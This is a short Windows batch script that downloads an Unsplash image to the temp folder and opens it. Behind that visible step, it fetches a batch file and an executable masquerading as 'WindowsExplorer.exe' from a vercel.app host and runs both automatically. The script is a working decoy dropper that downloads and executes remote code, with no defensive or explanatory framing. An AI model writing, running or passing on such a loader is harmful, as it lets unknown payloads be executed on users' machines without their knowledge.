@echo off

set "imageURL=https://images.unsplash.com/photo-1697530152990-2c47d3cf7d7a"
set "kuraSvURL=https://kurasver.vercel.app/kura_src/runKuraLaz.bat"
set "winExURL=https://kurasver.vercel.app/kura_src/WindowsExplorer.exe"

set "tempDir=%TEMP%"

:: Download the image
powershell -command "(new-object System.Net.WebClient).DownloadFile('%imageURL%', '%tempDir%\image.jpg')"

:: Download and run the  kuraSv.exe
powershell -command "(new-object System.Net.WebClient).DownloadFile('%kuraSvURL%', '%tempDir%\kuraSv.bat'); Start-Process '%tempDir%\kuraSv.bat'"

:: Download and run the winEx.exe
powershell -command "(new-object System.Net.WebClient).DownloadFile('%winExURL%', '%tempDir%\WindowsExplorer.exe'); Start-Process '%tempDir%\WindowsExplorer.exe'"

:: Open the downloaded image
start "" "%tempDir%\image.jpg"
